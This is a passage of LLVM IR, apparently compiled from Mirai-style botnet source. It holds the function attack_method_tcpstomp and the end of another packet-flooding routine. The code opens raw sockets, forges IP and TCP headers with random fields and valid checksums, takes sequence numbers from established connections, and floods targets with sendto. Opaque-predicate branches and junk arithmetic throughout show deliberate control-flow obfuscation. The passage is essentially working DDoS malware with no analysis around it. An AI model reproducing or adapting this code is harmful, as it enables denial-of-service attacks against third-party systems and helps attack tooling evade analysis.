  %gen167 = mul i16 %_166, 1
  %854 = and i16 %850, 1
  %_168 = sub i16 0, %854
  %gen169 = add i16 %_168, 8
  %855 = shl i16 %854, 8
  %_170 = sub i16 0, %853
  %gen171 = add i16 %_170, -257
  %_172 = sub i16 %853, -257
  %gen173 = mul i16 %_172, -257
  %_174 = shl i16 %853, -257
  %_175 = shl i16 %853, -257
  %856 = and i16 %853, -257
  %_176 = sub i16 0, %856
  %gen177 = add i16 %_176, %855
  %_178 = sub i16 %856, %855
  %gen179 = mul i16 %_178, %855
  %_180 = shl i16 %856, %855
  %_181 = sub i16 %856, %855
  %gen182 = mul i16 %_181, %855
  %_183 = shl i16 %856, %855
  %_184 = shl i16 %856, %855
  %857 = or i16 %856, %855
  store i16 %857, i16* %852, align 4
  %858 = call i32 @rand_next()
  %_185 = sub i32 %858, 65535
  %gen186 = mul i32 %_185, 65535
  %859 = and i32 %858, 65535
  %860 = trunc i32 %859 to i16
  %861 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %862 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %861, i32 0, i32 5
  store i16 %860, i16* %862, align 2
  %863 = load i8, i8* %30, align 1
  %864 = icmp ne i8 %863, 0
  br label %originalBB6

originalBB190alteredBB:                           ; preds = %originalBB190, %329
  store i32 0, i32* %17, align 4
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %351
  %865 = load i8**, i8*** %19, align 8
  %866 = load i32, i32* %17, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds i8*, i8** %865, i64 %867
  %869 = load i8*, i8** %868, align 8
  store i8* %869, i8** %40, align 8
  %870 = load i8*, i8** %40, align 8
  %871 = bitcast i8* %870 to %struct.iphdr*
  store %struct.iphdr* %871, %struct.iphdr** %41, align 8
  %872 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %873 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %872, i64 1
  %874 = bitcast %struct.iphdr* %873 to %struct.tcphdr*
  store %struct.tcphdr* %874, %struct.tcphdr** %42, align 8
  %875 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %876 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %875, i64 1
  %877 = bitcast %struct.tcphdr* %876 to i8*
  store i8* %877, i8** %43, align 8
  %878 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %879 = load i32, i32* %17, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %878, i64 %880
  %882 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %881, i32 0, i32 2
  %883 = load i8, i8* %882, align 4
  %884 = zext i8 %883 to i32
  %885 = icmp slt i32 %884, 32
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %410
  %886 = load i32, i32* %36, align 4
  %887 = icmp eq i32 %886, -1
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %429
  %888 = call i32 @rand_next()
  %889 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %890 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %889, i32 0, i32 8
  store i32 %888, i32* %890, align 4
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %449
  %891 = load i16, i16* %21, align 2
  %892 = zext i16 %891 to i32
  %893 = icmp eq i32 %892, 65535
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %469
  %894 = call i32 @rand_next()
  %_211 = shl i32 %894, 65535
  %_212 = shl i32 %894, 65535
  %_213 = sub i32 %894, 65535
  %gen214 = mul i32 %_213, 65535
  %_215 = sub i32 %894, 65535
  %gen216 = mul i32 %_215, 65535
  %_217 = shl i32 %894, 65535
  %_218 = sub i32 0, %894
  %gen219 = add i32 %_218, 65535
  %895 = and i32 %894, 65535
  %896 = trunc i32 %895 to i16
  %897 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %898 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %897, i32 0, i32 3
  store i16 %896, i16* %898, align 4
  br label %originalBB210

originalBB223alteredBB:                           ; preds = %originalBB223, %511
  %899 = load i32, i32* %26, align 4
  %900 = icmp eq i32 %899, 65535
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %530
  %901 = call i32 @rand_next()
  %902 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %903 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %902, i32 0, i32 2
  store i32 %901, i32* %903, align 4
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %550
  %904 = load i32, i32* %27, align 4
  %905 = icmp eq i32 %904, 65535
  br label %originalBB231

originalBB235alteredBB:                           ; preds = %originalBB235, %573
  %906 = load i8, i8* %35, align 1
  %907 = icmp ne i8 %906, 0
  br label %originalBB235

originalBB239alteredBB:                           ; preds = %originalBB239, %595
  %908 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %909 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %908, i32 0, i32 7
  store i16 0, i16* %909, align 2
  %910 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %911 = bitcast %struct.iphdr* %910 to i16*
  %912 = call zeroext i16 @checksum_generic(i16* %911, i32 20)
  %913 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %914 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %913, i32 0, i32 7
  store i16 %912, i16* %914, align 2
  %915 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %916 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %915, i32 0, i32 6
  store i16 0, i16* %916, align 4
  %917 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %918 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %919 = bitcast %struct.tcphdr* %918 to i8*
  %920 = load i32, i32* %34, align 4
  %921 = sext i32 %920 to i64
  %_240 = sub i64 20, %921
  %gen241 = mul i64 %_240, %921
  %_242 = sub i64 20, %921
  %gen243 = mul i64 %_242, %921
  %_244 = sub i64 0, 20
  %gen245 = add i64 %_244, %921
  %_246 = sub i64 20, %921
  %gen247 = mul i64 %_246, %921
  %922 = add i64 20, %921
  %923 = trunc i64 %922 to i16
  %924 = call zeroext i16 @htons(i16 zeroext %923) #7
  %925 = load i32, i32* %34, align 4
  %926 = sext i32 %925 to i64
  %_248 = shl i64 20, %926
  %_249 = sub i64 0, 20
  %gen250 = add i64 %_249, %926
  %_251 = shl i64 20, %926
  %_252 = shl i64 20, %926
  %_253 = sub i64 0, 20
  %gen254 = add i64 %_253, %926
  %_255 = shl i64 20, %926
  %_256 = sub i64 0, 20
  %gen257 = add i64 %_256, %926
  %927 = add i64 20, %926
  %928 = trunc i64 %927 to i32
  %929 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %917, i8* %919, i16 zeroext %924, i32 %928)
  %930 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %931 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %930, i32 0, i32 6
  store i16 %929, i16* %931, align 4
  %932 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %933 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %932, i32 0, i32 1
  %934 = load i16, i16* %933, align 2
  %935 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %936 = load i32, i32* %17, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %935, i64 %937
  %939 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %938, i32 0, i32 0
  %940 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %939, i32 0, i32 1
  store i16 %934, i16* %940, align 2
  %941 = load i32, i32* %18, align 4
  %942 = load i8*, i8** %40, align 8
  %943 = load i32, i32* %34, align 4
  %944 = sext i32 %943 to i64
  %_258 = shl i64 40, %944
  %_259 = shl i64 40, %944
  %_260 = shl i64 40, %944
  %_261 = shl i64 40, %944
  %_262 = sub i64 0, 40
  %gen263 = add i64 %_262, %944
  %945 = add i64 40, %944
  %946 = bitcast %union.__CONST_SOCKADDR_ARG* %44 to %struct.sockaddr**
  %947 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %948 = load i32, i32* %17, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %947, i64 %949
  %951 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %950, i32 0, i32 0
  %952 = bitcast %struct.sockaddr_in* %951 to %struct.sockaddr*
  store %struct.sockaddr* %952, %struct.sockaddr** %946, align 8
  %953 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %44, i32 0, i32 0
  %954 = load %struct.sockaddr*, %struct.sockaddr** %953, align 8
  %955 = call i64 @sendto(i32 %941, i8* %942, i64 %945, i32 16384, %struct.sockaddr* %954, i32 16)
  br label %originalBB239
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %815

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %815

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %originalBBpart2283, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %655

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %originalBBpart2273, %572, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %141

; <label>:124:                                    ; preds = %121
  %125 = load i32, i32* @x.29
  %126 = load i32, i32* @y.30
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %124
  %133 = load i32, i32* @x.29
  %134 = load i32, i32* @y.30
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %636

; <label>:141:                                    ; preds = %121
  %142 = load i32, i32* %26, align 4
  %143 = load i32, i32* %26, align 4
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %143, i32 3, i32 0)
  %145 = or i32 %144, 2048
  %146 = call i32 (i32, i32, ...) @fcntl(i32 %142, i32 4, i32 %145)
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 2
  %153 = load i8, i8* %152, align 4
  %154 = zext i8 %153 to i32
  %155 = icmp slt i32 %154, 32
  br i1 %155, label %156, label %193

; <label>:156:                                    ; preds = %141
  %157 = load i32, i32* @x.29
  %158 = load i32, i32* @y.30
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %156
  %165 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %166 = load i32, i32* %9, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i64 %167
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i32 0, i32 1
  %170 = load i32, i32* %169, align 4
  %171 = call i32 @ntohl(i32 %170) #7
  %172 = call i32 @rand_next()
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 2
  %178 = load i8, i8* %177, align 4
  %179 = zext i8 %178 to i32
  %180 = lshr i32 %172, %179
  %181 = add i32 %171, %180
  %182 = call i32 @htonl(i32 %181) #7
  %183 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %183, i32 0, i32 0
  store i32 %182, i32* %184, align 4
  %185 = load i32, i32* @x.29
  %186 = load i32, i32* @y.30
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart216, label %originalBB1alteredBB

originalBBpart216:                                ; preds = %originalBB1
  br label %202

; <label>:193:                                    ; preds = %141
  %194 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %195 = load i32, i32* %9, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i64 %196
  %198 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  br label %202

; <label>:202:                                    ; preds = %193, %originalBBpart216
  %203 = load i16, i16* %17, align 2
  %204 = zext i16 %203 to i32
  %205 = icmp eq i32 %204, 65535
  br i1 %205, label %206, label %211

; <label>:206:                                    ; preds = %202
  %207 = call i32 @rand_next()
  %208 = and i32 %207, 65535
  %209 = trunc i32 %208 to i16
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %209, i16* %210, align 2
  br label %231

; <label>:211:                                    ; preds = %202
  %212 = load i32, i32* @x.29
  %213 = load i32, i32* @y.30
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %211
  %220 = load i16, i16* %17, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %221, i16* %222, align 2
  %223 = load i32, i32* @x.29
  %224 = load i32, i32* @y.30
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %231

; <label>:231:                                    ; preds = %originalBBpart220, %206
  %232 = load i32, i32* %26, align 4
  %233 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %234 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %234, %struct.sockaddr** %233, align 8
  %235 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %236 = load %struct.sockaddr*, %struct.sockaddr** %235, align 8
  %237 = call i32 @connect(i32 %232, %struct.sockaddr* %236, i32 16)
  %238 = call i64 @time(i64* null) #6
  store i64 %238, i64* %31, align 8
  br label %239

; <label>:239:                                    ; preds = %634, %231
  %240 = load i32, i32* @x.29
  %241 = load i32, i32* @y.30
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %239
  store i32 16, i32* %29, align 4
  %248 = load i32, i32* %10, align 4
  %249 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %250 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %251 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %251, %struct.sockaddr** %250, align 8
  %252 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %253 = load %struct.sockaddr*, %struct.sockaddr** %252, align 8
  %254 = call i64 @recvfrom(i32 %248, i8* %249, i64 256, i32 16384, %struct.sockaddr* %253, i32* %29)
  %255 = trunc i64 %254 to i32
  store i32 %255, i32* %33, align 4
  %256 = load i32, i32* %33, align 4
  %257 = icmp eq i32 %256, -1
  %258 = load i32, i32* @x.29
  %259 = load i32, i32* @y.30
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %257, label %266, label %283

; <label>:266:                                    ; preds = %originalBBpart224
  %267 = load i32, i32* @x.29
  %268 = load i32, i32* @y.30
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %266
  %275 = load i32, i32* @x.29
  %276 = load i32, i32* @y.30
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %815

; <label>:283:                                    ; preds = %originalBBpart224
  %284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %285 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %288 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 4
  %290 = icmp eq i32 %286, %289
  br i1 %290, label %291, label %594

; <label>:291:                                    ; preds = %283
  %292 = load i32, i32* %33, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp ugt i64 %293, 40
  br i1 %294, label %295, label %594

; <label>:295:                                    ; preds = %291
  %296 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %297 = getelementptr inbounds i8, i8* %296, i64 20
  %298 = bitcast i8* %297 to %struct.tcphdr*
  store %struct.tcphdr* %298, %struct.tcphdr** %35, align 8
  %299 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %300 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %299, i32 0, i32 0
  %301 = load i16, i16* %300, align 4
  %302 = zext i16 %301 to i32
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %593

; <label>:307:                                    ; preds = %295
  %308 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 4
  %310 = load i16, i16* %309, align 4
  %311 = lshr i16 %310, 9
  %312 = and i16 %311, 1
  %313 = zext i16 %312 to i32
  %314 = icmp ne i32 %313, 0
  br i1 %314, label %315, label %556

; <label>:315:                                    ; preds = %307
  %316 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = lshr i16 %318, 12
  %320 = and i16 %319, 1
  %321 = zext i16 %320 to i32
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %323, label %556

; <label>:323:                                    ; preds = %315
  %324 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %325 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 4
  %327 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %328 = load i32, i32* %9, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %327, i64 %329
  %331 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %330, i32 0, i32 0
  store i32 %326, i32* %331, align 4
  %332 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 2
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %336, i64 %338
  %340 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %339, i32 0, i32 1
  store i32 %335, i32* %340, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 3
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @ntohl(i32 %343) #7
  %345 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %346 = load i32, i32* %9, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %345, i64 %347
  %349 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %348, i32 0, i32 2
  store i32 %344, i32* %349, align 4
  %350 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 1
  %352 = load i16, i16* %351, align 2
  %353 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
